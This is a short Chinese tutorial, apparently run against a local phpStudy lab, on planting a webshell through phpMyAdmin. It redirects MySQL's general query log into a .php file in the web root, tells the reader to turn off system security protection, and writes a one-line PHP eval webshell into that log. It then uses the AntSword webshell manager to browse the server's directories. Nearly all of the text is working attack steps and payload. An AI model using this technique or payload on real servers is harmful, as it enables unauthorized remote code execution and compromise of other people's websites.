PhPMyAdmin与蚁剑获取网站目录

Created2023-11-22|Updated2023-11-22
|Post Views:

一、安装phpMyAdmin

在小皮面板–>软件管理，找到phpMyAdmin

安装完成后，点击管理即可打开phpMyAdmin页面（http://localhost/phpMyAdmin4.8.5/），用户名和密码

二、获取目录

1.查看MySQL数据库服务器中系统变量（secure_file_priv）是否为Null

在SQL中输入命令 show global variables like '%secure%'

2.查看是否开启全局日志记录：show variables like '%general%'

输入：set global general_log=ON 开启全局日志记录

输入：set global general_log_file="C:/phpstudy_pro/WWW/log.php" 在WWW文件夹下面创建一个日志文件

3.关闭电脑系统安全防护

4.改写日志文件

输入 SELECT ““ 命令 在log文件里写入phpinfo

在网站上查找WWW，即可找到网站目录信息

三、AntSword安装

在日志文件中插入一句话木马select “ <?php @eval($_POST[cmd]);?>”

点击AntS word.exe启动，初始化会下载代码压缩包antSword-master.zip，解压到当前目录下即可

再次打开AntSword，选择刚才解压的文件即可进入

成功初始化后在空白处右键，添加数据

双击进入目录
